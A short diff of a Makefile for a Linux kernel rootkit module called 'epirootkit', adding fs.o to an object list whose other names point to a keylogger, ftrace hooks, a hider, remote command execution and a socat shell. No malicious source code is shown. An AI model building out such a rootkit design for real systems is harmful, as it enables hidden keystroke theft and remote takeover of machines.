@@ -3,7 +3,7 @@ PWD = $(shell pwd)
 obj-m = epirootkit.o
 epirootkit-objs = main.o network.o exec_cmd.o socat.o \
 					file_ops.o epikeylog.o ftrace.o hooks.o hider.o \
-					rootkit_command.o
+					rootkit_command.o fs.o
 
 modules: $(mult-objs)
 	@./generate_socat_h.sh
